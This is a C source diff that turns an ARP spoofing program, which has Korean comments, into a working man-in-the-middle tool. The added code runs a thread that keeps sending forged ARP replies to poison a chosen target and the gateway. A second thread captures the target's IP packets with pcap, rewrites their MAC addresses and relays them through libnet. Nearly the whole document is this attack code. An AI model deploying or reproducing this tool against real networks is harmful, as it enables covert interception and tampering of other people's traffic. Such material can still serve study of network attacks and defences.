@@ -1,7 +1,5 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <pcap.h>
-#include <netinet/if_ether.h>
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <sys/ioctl.h>
@@ -10,6 +8,42 @@
 #include <string.h>
 #include <pthread.h>
 #include <unistd.h>
+#include <netinet/if_ether.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
+#include <netinet/ip_icmp.h>
+#include <pcap.h>
+#include <libnet.h>
+
+typedef struct arg_cb_send_packet{
+  unsigned char* interface;
+  unsigned char gateway_mac[6];
+  unsigned char gateway_ip[16];
+  unsigned char target_mac[6];
+  unsigned char target_ip[16];
+  unsigned char local_mac[6];
+  unsigned char local_ip[16];
+} ArgSendPacket;
+
+typedef struct arg_t_receive_packet{
+  char* interface;
+  unsigned char* gateway_mac;
+  unsigned char* gateway_ip;
+  unsigned char* target_mac;
+  unsigned char* target_ip;
+  unsigned char* local_mac;
+  unsigned char* local_ip;
+} ArgRevPacket;
+
+typedef struct arg_t_arp_reply_mitm{
+  char* interface;
+  unsigned char* gateway_ip;
+  unsigned char* gateway_mac;
+  unsigned char* target_ip;
+  unsigned char* target_mac;
+  unsigned char* local_mac;
+} ArgArpReply;
 
 int get_local_mac(char* buffer, int buf_size){
   struct ifreq ifr;
@@ -121,7 +155,14 @@ int send_arp_request_broadcast(char* interface, unsigned char* source_ip, unsign
 }
 
 
-int send_arp_reply_mitm(char* interface, unsigned char* gateway_ip, unsigned char* gateway_mac, unsigned char* target_ip, unsigned char* target_mac, unsigned char* local_mac){  
+void t_send_arp_reply_mitm(void* data){
+  char* interface = ((ArgArpReply*)data)->interface;
+  unsigned char* gateway_ip = ((ArgArpReply*)data)->gateway_ip;
+  unsigned char* gateway_mac = ((ArgArpReply*)data)->gateway_mac;
+  unsigned char* target_ip = ((ArgArpReply*)data)->target_ip;
+  unsigned char* target_mac = ((ArgArpReply*)data)->target_mac;
+  unsigned char* local_mac = ((ArgArpReply*)data)->local_mac;
+  
   while(1){
     // Construct Ethernet Header
     struct ether_header header;
@@ -357,6 +398,98 @@ int get_localhost_ip(char* buffer, char* interface){
 }
 
 
+void cb_send_packet(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet){
+  struct ether_header* ethhdr;
+  struct ip* iph;
+  struct tcphdr* tcph;
+  struct udphdr* udph;
+  u_char* send_packet;
+  libnet_t *l;
+  struct libnet_link_int* network;
+  char errbuf[LIBNET_ERRBUF_SIZE];
+  int c;
+
+  l = libnet_init(LIBNET_LINK_ADV, ((ArgSendPacket*)arg)->interface, errbuf);
+  if(l == NULL){
+    printf("[DEBUG] libnet_init() failed: %s\n", errbuf);
+  }
+  
+  ethhdr = packet;
+  if(ntohs(ethhdr->ether_type) == ETHERTYPE_IP){  // IP 패킷 이라면
+    // Src, Dest MAC 변경
+    if(memcmp(ethhdr->ether_shost, ((ArgSendPacket*)arg)->target_mac, sizeof(ethhdr->ether_shost)))  // OutBound 일 경우
+      memcpy(ethhdr->ether_dhost, ((ArgSendPacket*)arg)->gateway_mac, sizeof(ethhdr->ether_dhost));
+    else if(memcmp(ethhdr->ether_shost, ((ArgSendPacket*)arg)->gateway_mac, sizeof(ethhdr->ether_shost)))  // InBound 일 경우
+      memcpy(ethhdr->ether_dhost, ((ArgSendPacket*)arg)->target_mac, sizeof(ethhdr->ether_dhost));
+    memcpy(ethhdr->ether_shost, ((ArgSendPacket*)arg)->local_mac, sizeof(ethhdr->ether_shost));  
+    
+    // Src, Dest IP 변경
+    packet += sizeof(struct ether_header);
+    iph = (struct ip*)packet;/*  // IP 레이어는 변경해줄 필요가 없다고 함
+    if(strcmp(inet_ntoa(iph->ip_src), ((ArgSendPacket*)arg)->target_ip))  // OutBound 일 경우 
+      iph->ip_dst.s_addr = inet_addr(((ArgSendPacket*)arg)->gateway_ip);
+    else if(strcmp(inet_ntoa(iph->ip_src), ((ArgSendPacket*)arg)->gateway_ip))  // InBound 일 경우
+      iph->ip_dst.s_addr = inet_addr(((ArgSendPacket*)arg)->target_ip);
+    iph->ip_src.s_addr = inet_addr(((ArgSendPacket*)arg)->local_ip);
+    */
+    packet += sizeof(struct ip);
+
+    if ((libnet_build_ethernet(ethhdr->ether_dhost, ethhdr->ether_shost, ETHERTYPE_IP, NULL, 0, l, NULL)) == -1)
+    fprintf(stderr, "[DEBUG] Cannot build ethernet header: %s\n", libnet_geterror(l));
+    libnet_build_ipv4((pkthdr->len) - sizeof(struct ether_header), iph->ip_tos, iph->ip_id, iph->ip_off, iph->ip_ttl, iph->ip_p, iph->ip_sum, iph->ip_src.s_addr, iph->ip_dst.s_addr, packet, (pkthdr->len) - (sizeof(struct ether_header) + sizeof(struct ip)), l, NULL);
+    
+    if((libnet_write(l)) == -1)
+      fprintf(stderr, "[DEBUG] Unable to send packet: %s\n", libnet_geterror(l));
+  }
+  
+  libnet_destroy(l);
+  
+  return 0;
+}
+
+
+void t_receive_packet(void* data){
+  pcap_t* handle;
+  char errbuf[PCAP_ERRBUF_SIZE];
+  bpf_u_int32 net;
+  bpf_u_int32 mask;
+  struct bpf_program fp;
+  struct pcap_pkthdr header;
+  const u_char* packet;
+  ArgSendPacket arg;
+
+  handle = pcap_open_live(((ArgRevPacket*)data)->interface, BUFSIZ, 1, 1000, errbuf);
+  if(handle == NULL){
+    fprintf(stderr, "[DEBUG] Could not open device %s: %s\n", ((ArgRevPacket*)data)->interface, errbuf);
+    return NULL;
+  }
+
+  char* filter_exp = "";
+  if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1){
+    fprintf(stderr, "[DEBUG] Could not parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
+    return NULL;
+  }
+
+  if(pcap_setfilter(handle, &fp) == -1){
+    fprintf(stderr, "[DEBUG] Could not install filter %s: %s\n", filter_exp, pcap_geterr(handle));
+    return NULL;
+  }
+  
+  arg.interface = ((ArgRevPacket*)data)->interface;
+  memcpy(arg.gateway_mac, ((ArgRevPacket*)data)->gateway_mac, sizeof(arg.gateway_mac));
+  memcpy(arg.gateway_ip, ((ArgRevPacket*)data)->gateway_ip, sizeof(arg.gateway_ip));
+  memcpy(arg.target_mac, ((ArgRevPacket*)data)->target_mac, sizeof(arg.target_mac));
+  memcpy(arg.target_ip, ((ArgRevPacket*)data)->target_ip, sizeof(arg.target_ip));
+  memcpy(arg.local_mac, ((ArgRevPacket*)data)->local_mac, sizeof(arg.local_mac));
+  memcpy(arg.local_ip, ((ArgRevPacket*)data)->local_ip, sizeof(arg.local_ip));
+  
+  pcap_loop(handle, 0, cb_send_packet, &arg);
+  pcap_close(handle);
+  return 0;
+}
+
+
+
 int main(int argc, char** argv){
   char* dev;
   char* net;
@@ -365,6 +498,7 @@ int main(int argc, char** argv){
   unsigned char gateway_mac[6];
   unsigned char gateway_ip[16];
   unsigned char target_mac[6];
+  //unsigned char target_ip[16];
   int ret;
   int i;
   char errbuf[PCAP_ERRBUF_SIZE];
@@ -375,6 +509,9 @@ int main(int argc, char** argv){
   const u_char* packet;
   struct bpf_program fp;
   pcap_t* pcd;
+  pthread_t p_thread[2];
+  ArgArpReply arg_t_arp_reply;
+  ArgRevPacket arg_t_rev_packet;
 
   // arg check & show help
   if(argc < 2){
@@ -447,7 +584,31 @@ int main(int argc, char** argv){
   printf("\n");
   printf("[*] Sending poisoning payload to gateway and target...\n");
   printf("[*] if you want to stop, press Ctrl+C.\n");
-  send_arp_reply_mitm(dev, gateway_ip, gateway_mac, argv[1], target_mac, local_mac);
+
+  arg_t_arp_reply.interface = dev;
+  arg_t_arp_reply.gateway_ip = gateway_ip;
+  arg_t_arp_reply.gateway_mac = gateway_mac;
+  arg_t_arp_reply.target_ip = argv[1];
+  arg_t_arp_reply.target_mac = target_mac;
+  arg_t_arp_reply.local_mac = local_mac;
+  if(0 > pthread_create(&p_thread[0], NULL, t_send_arp_reply_mitm, (void*)&arg_t_arp_reply))
+    perror("[-] Send ARP MITM Reply Failed !\n");
+  //send_arp_reply_mitm(dev, gateway_ip, gateway_mac, argv[1], target_mac, local_mac);
+
+  //  pthread_join(p_thread[0], NULL);
+
+  arg_t_rev_packet.interface = dev;
+  arg_t_rev_packet.gateway_ip = gateway_ip;
+  arg_t_rev_packet.gateway_mac = gateway_mac;
+  arg_t_rev_packet.target_ip = argv[1];
+  arg_t_rev_packet.target_mac = target_mac;
+  arg_t_rev_packet.local_mac = local_mac;
+  arg_t_rev_packet.local_ip = local_ip;
+  if(0 > pthread_create(&p_thread[1], NULL, t_receive_packet, (void*)&arg_t_rev_packet))
+    perror("[DEBUG] Packet Relaying thread_create Failed !\n");
+  printf("[*] Packet Relaying...\n");
+  pthread_join(p_thread[1], NULL);
   
   return 0;
 }
+
